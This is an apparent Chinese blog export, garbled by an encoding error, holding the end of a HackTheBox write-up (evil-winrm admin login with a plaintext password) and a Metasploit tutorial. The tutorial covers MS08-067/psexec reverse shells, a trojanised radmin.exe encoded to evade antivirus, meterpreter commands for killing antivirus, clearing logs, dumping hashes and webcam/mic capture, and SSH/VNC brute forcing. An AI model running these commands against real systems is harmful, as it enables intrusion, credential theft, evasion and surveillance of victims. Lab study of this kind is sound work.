<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]</span><br><span class="line">    -S, --ssl                        Enable ssl</span><br><span class="line">    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate</span><br><span class="line">    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate</span><br><span class="line">    -r, --realm DOMAIN               Kerberos auth, it has to be <span class="built_in">set</span> also <span class="keyword">in</span> /etc/krb5.conf file using this format -&gt; CONTOSO.COM = &#123; kdc = fooserver.contoso.com &#125;</span><br><span class="line">    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts <span class="built_in">local</span> path</span><br><span class="line">    -e, --executables EXES_PATH      C<span class="comment"># executables local path</span></span><br><span class="line">    -i, --ip IP                      Remote host IP or hostname (required)</span><br><span class="line">    -U, --url URL                    Remote url endpoint (default wsman)</span><br><span class="line">    -u, --user USER                  Username (required <span class="keyword">if</span> not using kerberos)</span><br><span class="line">    -p, --password PASS              Password</span><br><span class="line">    -H, --<span class="built_in">hash</span> NTHash                NTHash </span><br><span class="line">    -P, --port PORT                  Remote host port (default 5985)</span><br><span class="line">    -V, --version                    Show version</span><br><span class="line">    -n, --no-colors                  Disable colors</span><br><span class="line">    -h, --<span class="built_in">help</span>                       Display this <span class="built_in">help</span> message</span><br></pre></td></tr></table></figure>

<p><code>ææƒ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/remote/evil-winrm<span class="comment"># ruby evil-winrm.rb -u &#x27;administrator&#x27; -p &#x27;!R3m0te!&#x27; -i &#x27;10.10.10.180&#x27;</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2.3</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cd</span>\</span><br><span class="line">*Evil-WinRM* PS C:\&gt; whoami</span><br><span class="line">remote\administrator</span><br></pre></td></tr></table></figure>

<p><code>æŸ¥æ‰¾root.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\users\administrator&gt; <span class="built_in">cd</span> desktop</span><br><span class="line">*Evil-WinRM* PS C:\users\administrator\desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users\administrator\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---        8/31/2020  10:33 AM             34 root.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\users\administrator\desktop&gt; <span class="built_in">type</span> root.txt</span><br><span class="line">*********************************************</span><br><span class="line">*Evil-WinRM* PS C:\users\administrator\desktop&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>MSFçš„ç®€å•æ“ä½œ</title>
    <url>/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="0x01-å†™åœ¨å‰é¢"><a href="#0x01-å†™åœ¨å‰é¢" class="headerlink" title="0x01.å†™åœ¨å‰é¢"></a>0x01.å†™åœ¨å‰é¢</h1><blockquote>
<p><strong>Metasploité¡¹ç›®</strong>æ˜¯ä¸€ä¸ªæ—¨åœ¨æä¾›å®‰å…¨æ¼æ´ä¿¡æ¯è®¡ç®—æœºå®‰å…¨é¡¹ç›®ï¼Œå¯ä»¥ååŠ©å®‰å…¨å·¥ç¨‹å¸ˆè¿›è¡Œæ¸—é€æµ‹è¯•åŠå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ]ç­¾åå¼€å‘ã€‚metspolitæ¡†æ¶å…±æœ‰å››ä¸ªç‰ˆæœ¬ï¼ˆMetasploit Framework Editionï¼ŒMetasploit Community Editionï¼ŒMetasploit Expressï¼ŒMetasploit Proï¼‰ï¼ŒMSFä¸ºå…¶ä¸­çš„å¼€æºå…è´¹ç‰ˆæœ¬ï¼Œå…¶ä»–ä¸ºæ”¶è´¹ç‰ˆæœ¬ï¼Œä½†åŠŸèƒ½ä¹Ÿæ›´åŠ å¼ºå¤§ã€‚æœ€æ–°çš„MSFä¸ºMSF5.0ï¼Œ5.0æä¾›äº†æ–°çš„æ•°æ®æœåŠ¡ï¼Œå¼•å…¥äº†æ–°çš„å…æ€åŠŸèƒ½ï¼Œæ”¯æŒå¤šç§è¯­è¨€ã€‚</p>
</blockquote>
<p><strong>å…è´£å£°æ˜ï¼šæœ¬æ–‡åªä¸ºå­¦ä¹ è®°å½•ï¼Œä»»ä½•äººéæ³•ä½¿ç”¨äº§ç”Ÿçš„ä»»ä½•åæœï¼Œä½œè€…æ¦‚ä¸è´Ÿè´£ï¼ï¼ï¼</strong></p>
<a id="more"></a>

<h2 id="ä¸€ã€MSF5çš„7å¤§æ¨¡å—"><a href="#ä¸€ã€MSF5çš„7å¤§æ¨¡å—" class="headerlink" title="ä¸€ã€MSF5çš„7å¤§æ¨¡å—"></a>ä¸€ã€MSF5çš„7å¤§æ¨¡å—</h2><hr>
<h3 id="1-auxiliary"><a href="#1-auxiliary" class="headerlink" title="1.auxiliary"></a>1.auxiliary</h3><blockquote>
<p>è´Ÿè´£æ‰§è¡Œä¿¡æ¯æ”¶é›†ã€æ‰«æã€å—…æ¢ã€æŒ‡çº¹è¯†åˆ«ã€å£ä»¤çŒœæµ‹å’ŒDosæ”»å‡»ç­‰åŠŸèƒ½çš„è¾…åŠ©æ¨¡å—</p>
</blockquote>
<h3 id="2-exploits"><a href="#2-exploits" class="headerlink" title="2.exploits"></a>2.exploits</h3><blockquote>
<p>åˆ©ç”¨ç³»ç»Ÿæ¼æ´è¿›è¡Œæ”»å‡»çš„åŠ¨ä½œï¼Œæ­¤æ¨¡å—å¯¹åº”æ¯ä¸€ä¸ªå…·ä½“æ¼æ´çš„æ”»å‡»æ–¹æ³•ï¼ˆä¸»åŠ¨ã€è¢«åŠ¨ï¼‰ </p>
</blockquote>
<h3 id="3-payloads"><a href="#3-payloads" class="headerlink" title="3.payloads"></a>3.payloads</h3><blockquote>
<p>æˆåŠŸexploitä¹‹åï¼ŒçœŸæ­£åœ¨ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œçš„ä»£ç æˆ–æŒ‡ä»¤ã€‚åˆ†ä¸º3ç§ç±»å‹çš„payloadï¼Œåˆ†åˆ«æ˜¯singleã€stageså’Œstagersã€‚shellcodeæ˜¯ç‰¹æ®Šçš„payloadï¼Œç”¨äºæ‹¿shellã€‚</p>
<p>singleï¼šä¸€ä¸ªå®Œæ•´çš„payloadï¼Œä¸éœ€è¦å¤–éƒ¨åº“ï¼Œall-in-one</p>
<p>stagerï¼šç›®æ ‡è®¡ç®—æœºå†…å­˜æœ‰é™ï¼Œå…ˆä¼ è¾“ä¸€ä¸ªè¾ƒå°çš„payloadç”¨äºå»ºç«‹è¿æ¥</p>
<p>stagesï¼šåˆ©ç”¨stagerå»ºç«‹çš„è¿æ¥ä¸‹è½½åç»­çš„payload</p>
<p>stagerä¸stagesæœ‰å¤šç§ç±»å‹ï¼Œé€‚ç”¨äºä¸åŒåœºæ™¯</p>
</blockquote>
<h3 id="4-encoders"><a href="#4-encoders" class="headerlink" title="4.encoders"></a>4.encoders</h3><blockquote>
<p>å¯¹payloadè¿›è¡ŒåŠ å¯†ï¼Œèº²é¿Anti Virusæ£€æŸ¥çš„æ¨¡å—</p>
</blockquote>
<h3 id="5-nops"><a href="#5-nops" class="headerlink" title="5.nops"></a>5.nops</h3><blockquote>
<p>æé«˜payloadç¨³å®šæ€§åŠç»´æŒå¤§å°ã€‚åœ¨æ¸—é€æ”»å‡»æ„é€ æ¶æ„æ•°æ®ç¼“å†²åŒºæ—¶ï¼Œå¸¸å¸¸è¦åœ¨çœŸæ­£è¦æ‰§è¡Œçš„Shellcodeä¹‹å‰æ·»åŠ ä¸€æ®µç©ºæŒ‡ä»¤åŒºï¼Œ è¿™æ ·å½“è§¦å‘æ¸—é€æ”»å‡»åè·³è½¬æ‰§è¡ŒShellcodeæ—¶ï¼Œæœ‰ä¸€ä¸ªè¾ƒå¤§çš„å®‰å…¨ç€é™†åŒºï¼Œä»è€Œé¿å…å—åˆ°å†…å­˜åœ°å€éšæœºåŒ–ã€è¿”å›åœ°å€è®¡ç®—åå·®ç­‰åŸå› é€ æˆçš„Shellcodeæ‰§è¡Œå¤±è´¥ï¼Œæé«˜æ¸—é€æ”»å‡»çš„å¯é æ€§ã€‚</p>
</blockquote>
<h3 id="6-post"><a href="#6-post" class="headerlink" title="6.post"></a>6.post</h3><blockquote>
<p>åæœŸæ¸—é€æ¨¡å—ã€‚åœ¨å–å¾—ç›®æ ‡ç³»ç»Ÿè¿œç¨‹æ§åˆ¶æƒåï¼Œè¿›è¡Œä¸€ç³»åˆ—çš„åæ¸—é€æ”»å‡»åŠ¨ä½œï¼Œå¦‚è·å–æ•æ„Ÿä¿¡æ¯ã€è·³æ¿æ”»å‡»ç­‰æ“ä½œ </p>
</blockquote>
<h3 id="7-evasion"><a href="#7-evasion" class="headerlink" title="7.evasion"></a>7.evasion</h3><blockquote>
<p>ç”¨äºå…æ€ç»•è¿‡</p>
</blockquote>
<h2 id="äºŒã€msfconsoleæ§åˆ¶å°"><a href="#äºŒã€msfconsoleæ§åˆ¶å°" class="headerlink" title="äºŒã€msfconsoleæ§åˆ¶å°"></a>äºŒã€msfconsoleæ§åˆ¶å°</h2><p>ä¸€èˆ¬å‚æ•°</p>
<blockquote>
<p>msfconsole -h    æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯</p>
<p>msfconsole -q    å®‰é™å¯åŠ¨</p>
</blockquote>
<p>ä¸€èˆ¬å‘½ä»¤</p>
<blockquote>
<p>banner    bannerä¿¡æ¯</p>
<p>color    é¢œè‰²è®¾ç½®</p>
<p>connect    è¿æ¥è®¾ç½®</p>
</blockquote>
<p>æ§åˆ¶å°å¸¸ç”¨å‘½ä»¤</p>
<blockquote>
<p>show æ¨¡å—    æŸ¥çœ‹æ¨¡å—ä¿¡æ¯</p>
<p>search å‚æ•°    æŸ¥æ‰¾æŒ‡å®šä¿¡æ¯ã€‚ä¾‹å¦‚ï¼šsearch name:mysql</p>
<p>use æŒ‡å®šæ–‡ä»¶    ä½¿ç”¨æŒ‡å®šæ–‡ä»¶ã€‚ä¾‹å¦‚ï¼šuse exploit/windows/smb/ms08_067_netapi</p>
<p>åœ¨useä¸‹å¯ä»¥æŸ¥çœ‹infoä¿¡æ¯ï¼ŒæŸ¥çœ‹å½“å‰expä¸‹å¯ä»¥ä½¿ç”¨çš„payloadã€ç³»ç»Ÿç­‰ä¿¡æ¯ã€‚</p>
<p>åœ¨useä¸‹ä¹Ÿå¯ä»¥ä½¿ç”¨show missingæŸ¥çœ‹éœ€è¦é…ç½®çš„å‚æ•°ï¼Œshow optionsæŸ¥çœ‹é…ç½®çš„å‚æ•°ï¼Œshow targetsæŸ¥çœ‹å¯ä»¥åˆ©ç”¨çš„å¯¹è±¡ï¼Œshow advancedæŸ¥çœ‹é«˜çº§é…ç½®å‚æ•°ï¼Œshow evasionæŸ¥çœ‹é¢çº±ç»•è¿‡ä¿¡æ¯</p>
<p>set/unset    ç”¨äºè®¾ç½®</p>
<p>setg/unsetg    å…¨å±€è®¾ç½®ï¼Œä»…åœ¨å½“å‰ä¼šè¯æœ‰æ•ˆï¼Œé€€å‡ºå¤±æ•ˆï¼Œå¯ä»¥ä½¿ç”¨saveä¿å­˜</p>
<p>check    ç”¨äºæµ‹è¯•æ˜¯å¦å¯ä»¥åˆ©ç”¨</p>
<p>back    è¿”å›ä¸Šä¸€çº§</p>
<p>db_    ä¸€ç³»åˆ—å‚æ•°</p>
<p>hosts    æŸ¥çœ‹ä¸»æœºå‚æ•°</p>
<p>hosts -c    æŸ¥çœ‹æŒ‡å®šåˆ—</p>
<p>hosts -S    ä»¥æŒ‡å®šå‚æ•°æœç´¢</p>
<p>services    æŸ¥çœ‹ç«¯å£ç­‰ï¼ˆ-S/-cï¼‰</p>
<p>run    æ‰§è¡Œå½“å‰æ¨¡å—</p>
<p>load    å¯¼å…¥å¤–éƒ¨æ¨¡å—</p>
<p>resource    æŒ‡å®šèµ„æºæ–‡ä»¶    æ–‡ä»¶å.rcï¼Œå°†é…ç½®ç›´æ¥å†™å…¥.rcï¼Œmsfconsole -r æ–‡ä»¶å.rc</p>
</blockquote>
<p>ä¸€ä¸ªåå¼¹shellå°æ¡ˆä¾‹ï¼Œæœ¬æ¬¡åˆ©ç”¨ms08_067</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line">set payload windows/shell/reverse_tcp</span><br><span class="line">set rhost 192.168.1.200</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set target 34</span><br><span class="line">run -j</span><br><span class="line">sessions -l</span><br><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200626115208454.png" class>

<h2 id="ä¸‰ã€å®éªŒæ¡ˆä¾‹"><a href="#ä¸‰ã€å®éªŒæ¡ˆä¾‹" class="headerlink" title="ä¸‰ã€å®éªŒæ¡ˆä¾‹"></a>ä¸‰ã€å®éªŒæ¡ˆä¾‹</h2><h3 id="1-active-exploitä¸PassiveMoudleæ¡ˆä¾‹"><a href="#1-active-exploitä¸PassiveMoudleæ¡ˆä¾‹" class="headerlink" title="(1)active exploitä¸PassiveMoudleæ¡ˆä¾‹"></a>(1)active exploitä¸PassiveMoudleæ¡ˆä¾‹</h3><p>ActiveModule</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search smb/psexec</span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">search shell/reverse</span><br><span class="line">set payload payload/windows/shell/reverse_tcp</span><br><span class="line">set rhosts 192.168.1.100</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set SMBUSER administrator</span><br><span class="line">set SMBPASS 11</span><br><span class="line">show options</span><br><span class="line">show targets</span><br><span class="line">run -j</span><br><span class="line">sessions -l</span><br><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure>

<p>PassiveMoudle</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search windows/browser/ms07_017_ani_loadimage_chunksize</span><br><span class="line">use windows/browser/ms07_017_ani_loadimage_chunksize</span><br><span class="line">set payload payload/windows/shell/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set srvhost 192.168.1.6</span><br><span class="line">run # ç­‰å¾…è®¿é—®å³å¯</span><br></pre></td></tr></table></figure>

<h3 id="ï¼ˆ2ï¼‰ç”Ÿæˆpayloadæ¡ˆä¾‹"><a href="#ï¼ˆ2ï¼‰ç”Ÿæˆpayloadæ¡ˆä¾‹" class="headerlink" title="ï¼ˆ2ï¼‰ç”Ÿæˆpayloadæ¡ˆä¾‹"></a>ï¼ˆ2ï¼‰ç”Ÿæˆpayloadæ¡ˆä¾‹</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use windows/shell_bind_tcp</span><br><span class="line">generate # ç¼–ç </span><br><span class="line">generate -b &#x27;\x00&#x27; # è¿‡æ»¤åå­—ç¬¦</span><br><span class="line">-e x86/shikata_ga_nai # æŒ‡å®šç¼–ç </span><br><span class="line">-i 5 # æŒ‡å®šç¼–ç æ¬¡æ•°</span><br><span class="line">-k # ä½¿ç”¨å½“å‰è¿›ç¨‹ï¼Œå¼€å¯ä¸€ä¸ªæ–°çš„çº¿ç¨‹</span><br><span class="line">-x /usr/share/windows-binaries/radmin.exe # ä½¿ç”¨ä¸€ä¸ªæ­£å¸¸çš„æ¨¡æ¿</span><br><span class="line">-f exe # è¾“å‡ºæŒ‡å®šæ ¼å¼æ–‡ä»¶</span><br><span class="line">-o /root/1.exe # è¾“å‡ºæ–‡ä»¶çš„åå­—</span><br><span class="line">-n 14 # æ·»åŠ 14ä¸ªå­—èŠ‚çš„NOP,NOPæ˜¯æ— ä»»ä½•æ“ä½œå­—ç¬¦ï¼Œå¯ä»¥èµ·åˆ°æ··æ·†ç»•è¿‡å…æ€çš„ä½œç”¨</span><br></pre></td></tr></table></figure>

<p>å°æ¡ˆä¾‹ï¼Œç”Ÿæˆä¸€ä¸ªä¼ªé€ çš„è¿œç¨‹ç®¡ç†å°ç¨‹åº</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">generate -b &#x27;\x00\xff&#x27; -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f exe -o /root/1.exe</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œ</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200624191334844.png" class>

<p>ncï¼Œgetshell</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200624191426746.png" class>

<h2 id="å››ã€meterpreterï¼Œæ³¨å…¥åˆ°åˆæ³•çš„æ“ä½œç³»ç»Ÿé‡Œçš„è¿›ç¨‹ï¼Œéšæœºã€‚"><a href="#å››ã€meterpreterï¼Œæ³¨å…¥åˆ°åˆæ³•çš„æ“ä½œç³»ç»Ÿé‡Œçš„è¿›ç¨‹ï¼Œéšæœºã€‚" class="headerlink" title="å››ã€meterpreterï¼Œæ³¨å…¥åˆ°åˆæ³•çš„æ“ä½œç³»ç»Ÿé‡Œçš„è¿›ç¨‹ï¼Œéšæœºã€‚"></a>å››ã€meterpreterï¼Œæ³¨å…¥åˆ°åˆæ³•çš„æ“ä½œç³»ç»Ÿé‡Œçš„è¿›ç¨‹ï¼Œéšæœºã€‚</h2><p>1.meterpreter shell æ¡ˆä¾‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search ms08_067</span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.1.200</span><br><span class="line">set target 34</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">run -j</span><br><span class="line">sessions -l</span><br><span class="line">sessions 1</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°meterpreter shell</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200626133358053.png" class>

<p>2.meterpreter shellä¸‹çš„å¸¸ç”¨å‘½ä»¤ï¼Œåœ¨meterpreter shellä¸‹å¯ä»¥ä½¿ç”¨Linuxå‘½ä»¤ä¸Windowså‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">help # å¸®åŠ©</span><br><span class="line">background # è¿”å›msfconlseï¼Œå¹¶ä¿å­˜session</span><br><span class="line">dir,pwd,cat,ls,mkdir,rmdir, edit,lcd,lpwdç­‰</span><br><span class="line">bgrun killav # æ€æ­»æ€ç—…æ¯’è½¯ä»¶</span><br><span class="line">bgrun vnc # ç›‘æ§</span><br><span class="line">clearev # æ¸…é™¤æ—¥å¿—</span><br><span class="line">download # ä¸‹è½½æ–‡ä»¶ download boot.ini</span><br><span class="line">upload # ä¸Šä¼  ä¾‹å¦‚ï¼šupload /usr/share/windows-binaries/nc.exe c:</span><br><span class="line">execute # æ‰§è¡Œ ä¾‹å¦‚ï¼šexecute -f cmd.exe -i -H -fä¸ºè¿è¡Œå“ªä¸ªç¨‹åº -iä¸ºäº¤äº’ -Hä¸ºéšè—</span><br><span class="line">getuid # æŸ¥çœ‹å½“å‰ç”¨æˆ·</span><br><span class="line">getsystem # ææƒåˆ°system</span><br><span class="line">getprivs # æŸ¥çœ‹æœ‰å“ªäº›æƒé™</span><br><span class="line">getproxy # è·å–ä»£ç†</span><br><span class="line">getpid # è·å–è¿›ç¨‹å·</span><br><span class="line">migrate 1548 # è¿ç§»è¿›ç¨‹</span><br><span class="line">hashdump # è·å–ç”¨æˆ·çš„å“ˆå¸Œå€¼</span><br><span class="line">sysinfo # æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</span><br><span class="line">reboot</span><br><span class="line">shutdown</span><br><span class="line">shell # è·å–shell</span><br><span class="line">show_mount # æŸ¥çœ‹æŒ‚è½½ç¡¬ç›˜</span><br><span class="line">search -f ein.ini # æŸ¥æ‰¾æ–‡ä»¶</span><br><span class="line">arp</span><br><span class="line">netstat</span><br><span class="line">ipcofnig</span><br><span class="line">ifconfig</span><br><span class="line">route</span><br><span class="line">idletime # æŸ¥çœ‹åœæ­¢æ“ä½œçš„æ—¶é—´</span><br><span class="line">resource -r æ–‡ä»¶ # è°ƒç”¨èµ„æºæ–‡ä»¶</span><br><span class="line">record_mic # éº¦å…‹é£</span><br><span class="line">webcam_list # æ‘„åƒå¤´</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="äº”ã€-msfcli"><a href="#äº”ã€-msfcli" class="headerlink" title="äº”ã€ msfcli"></a>äº”ã€ msfcli</h2><p>å·²è¢«msfconsole -xä»£æ›¿ï¼Œä¸å¥½ç©</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi;</span><br><span class="line">set rhosts 192.168.1.200;</span><br><span class="line">set target 34;</span><br><span class="line">set payload windows/meterpreter/reverse_tcp;</span><br><span class="line">set lhost 192.168.1.6;</span><br><span class="line">run -j&quot;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<hr>
<hr>
<h1 id="0x02-MSFä¿¡æ¯æ”¶é›†"><a href="#0x02-MSFä¿¡æ¯æ”¶é›†" class="headerlink" title="0x02.MSFä¿¡æ¯æ”¶é›†"></a>0x02.MSFä¿¡æ¯æ”¶é›†</h1><h2 id="ä¸€ã€å†…ç½®å¤–éƒ¨å·¥å…·"><a href="#ä¸€ã€å†…ç½®å¤–éƒ¨å·¥å…·" class="headerlink" title="ä¸€ã€å†…ç½®å¤–éƒ¨å·¥å…·"></a>ä¸€ã€å†…ç½®å¤–éƒ¨å·¥å…·</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">db_nmap 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<h2 id="äºŒã€auxiliaryæ¨¡å—"><a href="#äºŒã€auxiliaryæ¨¡å—" class="headerlink" title="äºŒã€auxiliaryæ¨¡å—"></a>äºŒã€auxiliaryæ¨¡å—</h2><h3 id="ä¾‹ä¸€ï¼Œarpä¸»æœºæ‰«æ"><a href="#ä¾‹ä¸€ï¼Œarpä¸»æœºæ‰«æ" class="headerlink" title="ä¾‹ä¸€ï¼Œarpä¸»æœºæ‰«æ"></a>ä¾‹ä¸€ï¼Œarpä¸»æœºæ‰«æ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search arp</span><br><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">show options</span><br><span class="line">set interface eth0 # è®¾ç½®ç½‘å¡</span><br><span class="line">set rhosts 192.168.1.0/24 # è®¾ç½®ç½‘æ®µ</span><br><span class="line">set threads 20 # è®¾ç½®çº¿ç¨‹æ•°</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="ä¾‹äºŒï¼Œç«¯å£æ‰«æ"><a href="#ä¾‹äºŒï¼Œç«¯å£æ‰«æ" class="headerlink" title="ä¾‹äºŒï¼Œç«¯å£æ‰«æ"></a>ä¾‹äºŒï¼Œç«¯å£æ‰«æ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search portscan</span><br><span class="line">set interface eth0</span><br><span class="line">set ports 80</span><br><span class="line">set rhosts 192.168.1.0/24</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="ä¾‹ä¸‰ï¼ŒUDPæ‰«æ"><a href="#ä¾‹ä¸‰ï¼ŒUDPæ‰«æ" class="headerlink" title="ä¾‹ä¸‰ï¼ŒUDPæ‰«æ"></a>ä¾‹ä¸‰ï¼ŒUDPæ‰«æ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure>

<h3 id="ä¾‹å››ï¼ŒSMTPæ‰«æ"><a href="#ä¾‹å››ï¼ŒSMTPæ‰«æ" class="headerlink" title="ä¾‹å››ï¼ŒSMTPæ‰«æ"></a>ä¾‹å››ï¼ŒSMTPæ‰«æ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/default/snmpd #ä¿®æ”¹ä¾¦å¬åœ°å€  0.0.0.0</span><br><span class="line">use auxiliary/scanner/snmp/snmp_login</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enumusers ï¼ˆwindowsï¼‰</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enumshares ï¼ˆwindowsï¼‰</span><br></pre></td></tr></table></figure>

<h3 id="ä¾‹äº”ï¼ŒSMBæ‰«æ"><a href="#ä¾‹äº”ï¼ŒSMBæ‰«æ" class="headerlink" title="ä¾‹äº”ï¼ŒSMBæ‰«æ"></a>ä¾‹äº”ï¼ŒSMBæ‰«æ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ç‰ˆæœ¬æ‰«æ</span><br><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"></span><br><span class="line">æ‰«æå‘½ä»¤ç®¡é“ï¼Œåˆ¤æ–­SMBæœåŠ¡ç±»å‹ï¼ˆè´¦å·ï¼Œå¯†ç ï¼‰</span><br><span class="line">use auxiliary/scanner/smb/pipe_auditor</span><br><span class="line"></span><br><span class="line">æ‰«æé€šè¿‡SMBç®¡é“å¯ä»¥è®¿é—®çš„RCERPCæœåŠ¡</span><br><span class="line">use auxiliary/scanner/smb/pipe_dcerpc_auditor</span><br><span class="line"></span><br><span class="line">SMBæšä¸¾å…±äº«</span><br><span class="line">use auxiliary/scanner/smb/smb_enumshares</span><br><span class="line"></span><br><span class="line">SMBç”¨æˆ·æšä¸¾</span><br><span class="line">use auxiliary/scanner/smb/smb_enumusers</span><br><span class="line"></span><br><span class="line">SMB SIDï¼ˆRIDï¼‰æšä¸¾</span><br><span class="line">use auxiliary/scanner/smb/smb_lookupsid</span><br></pre></td></tr></table></figure>

<h3 id="ä¾‹å…­ï¼ŒSSHæ‰«æ"><a href="#ä¾‹å…­ï¼ŒSSHæ‰«æ" class="headerlink" title="ä¾‹å…­ï¼ŒSSHæ‰«æ"></a>ä¾‹å…­ï¼ŒSSHæ‰«æ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SSHç‰ˆæœ¬æ‰«æ</span><br><span class="line">use auxiliary/scanner/ssh/ssh_versio</span><br><span class="line"></span><br><span class="line">SSHå¯†ç çˆ†ç ´</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">set userpass_file /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</span><br><span class="line"></span><br><span class="line">SSHå…¬é’¥ç™»å…¥</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login_pubkey</span><br></pre></td></tr></table></figure>



<h1 id="0x03-MSFæ¼æ´æ‰«æ"><a href="#0x03-MSFæ¼æ´æ‰«æ" class="headerlink" title="0x03.MSFæ¼æ´æ‰«æ"></a>0x03.MSFæ¼æ´æ‰«æ</h1><h2 id="å®éªŒæ¡ˆä¾‹"><a href="#å®éªŒæ¡ˆä¾‹" class="headerlink" title="å®éªŒæ¡ˆä¾‹"></a>å®éªŒæ¡ˆä¾‹</h2><h3 id="ä¾‹ä¸€ï¼Œvncå¯†ç ç ´è§£"><a href="#ä¾‹ä¸€ï¼Œvncå¯†ç ç ´è§£" class="headerlink" title="ä¾‹ä¸€ï¼Œvncå¯†ç ç ´è§£"></a>ä¾‹ä¸€ï¼Œvncå¯†ç ç ´è§£</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/vnc/vnc_login</span><br><span class="line">threads 30</span><br><span class="line">set BlANK_PASSWORDS yes</span><br><span class="line">set rhosts 192.168.1.5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="ä¾‹äºŒï¼Œvncæ— å¯†ç è®¿é—®"><a href="#ä¾‹äºŒï¼Œvncæ— å¯†ç è®¿é—®" class="headerlink" title="ä¾‹äºŒï¼Œvncæ— å¯†ç è®¿é—®"></a>ä¾‹äºŒï¼Œvncæ— å¯†ç è®¿é—®</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/vnc/vnc_none_auth</span><br><span class="line">set rhosts 192.168.1.5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

